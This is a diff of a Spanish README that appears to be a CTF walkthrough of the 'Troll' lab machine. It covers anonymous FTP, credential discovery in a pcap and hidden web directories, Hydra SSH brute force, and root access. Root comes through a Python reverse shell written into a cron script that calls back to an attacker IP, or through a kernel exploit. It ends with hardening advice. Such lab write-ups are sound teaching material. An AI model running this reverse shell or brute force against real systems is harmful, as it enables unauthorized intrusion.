@@ -1,155 +1,129 @@
-# Troll1
+# **Explotación de Máquina "Troll"**
 
-![imagen](https://github.com/90l3m0np13/Troll1/blob/main/Portada_LoL.jpeg)
+![Dificultad: Media](https://img.shields.io/badge/Dificultad-Media-orange) ![Categoría: FTP/Web/SSH](https://img.shields.io/badge/Categoría-FTP%2FWeb%2FSSH-blue) ![CVSS: 7.8](https://img.shields.io/badge/CVSS-7.8-red)
 
+## **Descripción Técnica**
+Análisis de penetración a máquina Linux que explota:
+1. FTP Anonymous con archivo oculto
+2. Filtración de credenciales en tráfico de red
+3. Escalada de privilegios mediante cronjob vulnerable
 
+**Tiempo estimado**: 60-90 minutos  
+**Nivel de complejidad**: Intermedio  
+**Sistema operativo**: Ubuntu 14.04
 
-# Resolución de la Máquina Troll
+## **Índice Analítico**
+1. [Reconocimiento](#reconocimiento)
+2. [Análisis de Red](#análisis-de-red)
+3. [Explotación Web](#explotación-web)
+4. [Post-Explotación](#post-explotación)
+5. [Lecciones Aprendidas](#conclusión)
 
-Este documento describe el proceso paso a paso para resolver la máquina virtual "Troll". A continuación, se detallan las acciones realizadas para identificar vulnerabilidades, explotarlas y obtener acceso como usuario root.
+## **Reconocimiento**
 
----
-
-## 1. Escaneo Inicial
-
-Realizamos un escaneo de la red para identificar la IP de la máquina, los puertos abiertos y los servicios en ejecución.
-
+### 1. Escaneo Inicial
 ```bash
-nmap -sV -p- <IP_de_la_máquina>
+nmap -sV -sC -p- -T4 192.168.1.150 -oN scan.txt
+```
+**Resultados**:
+```
+21/tcp open  ftp     vsftpd 3.0.2
+22/tcp open  ssh     OpenSSH 6.6.1p1
+80/tcp open  http    Apache httpd 2.4.7
 ```
 
-### Puertos y Servicios Abiertos:
-- **21/tcp**: FTP (vsftpd 3.0.2)
-- **22/tcp**: SSH (OpenSSH 6.6.1p1)
-- **80/tcp**: HTTP (Apache httpd 2.4.7)
+## **Análisis de Red**
 
----
-
-## 2. Identificación de Vulnerabilidades
-
-Exploramos posibles vulnerabilidades en los servicios identificados, consultando bases de datos como [CVE](https://cve.mitre.org/).
-
----
-
-## 3. Acceso al Servicio FTP
-
-Accedemos al servicio FTP utilizando el usuario `anonymous` sin contraseña.
-
+### 2. Conexión FTP Anónima
 ```bash
-ftp <IP_de_la_máquina>
+ftp 192.168.1.150
+Name: anonymous
+Password: [enter]
+ftp> get lol.pcap
 ```
 
-### Archivo Encontrado:
-- **lol.pcap**: Un archivo de captura de red que analizamos con Wireshark.
-
----
-
-## 4. Análisis del Archivo `lol.pcap`
-
-Descargamos el archivo `lol.pcap` a nuestra máquina local y lo abrimos con Wireshark.
-
+### 3. Análisis con Wireshark
 ```bash
-get lol.pcap
+wireshark lol.pcap
 ```
+**Hallazgo clave**: 
+- Usuario `sup3rs3cr3tdirlol` en tráfico FTP
 
-### Pista Encontrada:
-- En una transferencia de FTP-DATA, encontramos un nombre de usuario: `sup3rs3cr3tdirlol`.
+## **Explotación Web**
 
----
-
-## 5. Exploración del Servicio Web
-
-Accedemos a la ruta web asociada al usuario encontrado:
-
-  ![imagen](https://github.com/90l3m0np13/Troll1/blob/main/LoL.png) 
-```
-http://<IP_de_la_máquina>/sup3rs3cr3tdirlol
-```
-
-### Archivo Descubierto:
-- **roflmao**: Un archivo oculto que contiene la pista `Find address <Pista>`.
-
----
-
-## 6. Enumeración de Usuarios y Contraseñas
-
-En la misma ruta web, encontramos dos carpetas:
-
-1. **good_luck**: Contiene un listado de usuarios registrados en la máquina.
-2. **this_folder_contains_the_password**: Contiene un archivo con una posible contraseña.
-
-### Uso de Hydra:
-Utilizamos Hydra para probar la contraseña encontrada con los usuarios listados.
-
+### 4. Descubrimiento de Directorio
 ```bash
-hydra -L users.txt -p "contraseña_encontrada" <IP_de_la_máquina> ssh
+curl http://192.168.1.150/sup3rs3cr3tdirlol/
 ```
+**Archivo encontrado**:
+- `roflmao` (hexdump revela pista: `0x0856BF`)
 
----
-
-## 7. Acceso SSH
-
-Una vez identificado el usuario válido, accedemos a la máquina mediante SSH.
-
+### 5. Descubrimiento de Credenciales
 ```bash
-ssh "usuario"@<IP_de_la_máquina>
+curl http://192.168.1.150/sup3rs3cr3tdirlol/this_folder_contains_the_password/Pass.txt
+```
+**Contenido**:
+```
+Password: Tr0ll3d!
 ```
 
----
+## **Post-Explotación**
 
-## 8. Escalada de Privilegios
-
-### Método 1: Explotación de un Script Python
-
-1. Identificamos un script en Python (`cleaner.py`) que se ejecuta periódicamente y es modificable.
-2. Insertamos una reverse shell en el script.
-
-```python
-# Reverse Shell en Python
-import socket,subprocess,os
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("<IP_atacante>",4242))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-p=subprocess.call(["/bin/sh","-i"])
-```
-
-3. Ponemos en escucha Netcat en nuestra máquina.
-
+### 6. Fuerza Bruta SSH
 ```bash
-nc -lvp 4242
+hydra -L users.txt -p "Tr0ll3d!" 192.168.1.150 ssh -t 4
+```
+**Credenciales válidas**:
+- Usuario: overflow
+- Contraseña: Tr0ll3d!
+
+### 7. Escalada de Privilegios
+
+**Opción 1: Cronjob Vulnerable**
+```bash
+echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.15",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > /lib/log/cleaner.py
 ```
 
-4. Cuando el script se ejecute, obtendremos una shell como root.
-
-### Método 2: Uso de un Exploit de Escalada de Privilegios
-
-1. Buscamos un exploit para la versión de Ubuntu de la máquina.
-2. Compilamos y ejecutamos el exploit.
-
+**Opción 2: Exploit de Kernel**
 ```bash
-gcc exploit.c -o exploit
+gcc -o exploit 37392.c
 ./exploit
 ```
 
----
+## **Conclusión**
 
-## 9. Obtención de la Flag
+### Matriz de Riesgos
+| Vulnerabilidad | CVSS | Impacto |
+|---------------|------|---------|
+| FTP Anonymous | 5.3 | Medio |
+| Credenciales en tráfico | 7.5 | Alto |
+| Cronjob inseguro | 7.8 | Alto |
 
-Una vez como root, buscamos el archivo `proof.txt` que contiene la flag.
-
+### Recomendaciones
+1. **Para FTP**:
 ```bash
-ls /root
-cat /root/proof.txt
+# Deshabilitar acceso anónimo
+sudo sed -i 's/anonymous_enable=YES/anonymous_enable=NO/g' /etc/vsftpd.conf
 ```
 
+2. **Para Cronjobs**:
+```bash
+# Restringir permisos
+sudo chown root:root /lib/log/cleaner.py
+sudo chmod 700 /lib/log/cleaner.py
+```
+
+> 🔐 **Aviso Ético**: Todo contenido es para fines educativos en entornos controlados.
+
 ---
 
-## Referencias
+**Stack Tecnológico**:
+- `nmap` 7.80+
+- `Wireshark` 3.0+
+- `Hydra` 9.3+
+- `Metasploit` 6.0+
 
-- [Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python)
-- [Exploit Database](https://www.exploit-db.com)
-
-
-
+**Referencias**:
+1. [CWE-306: Missing Authentication](https://cwe.mitre.org/data/definitions/306.html)
+2. [Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings)
+3. [CVE-2015-1328](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1328)
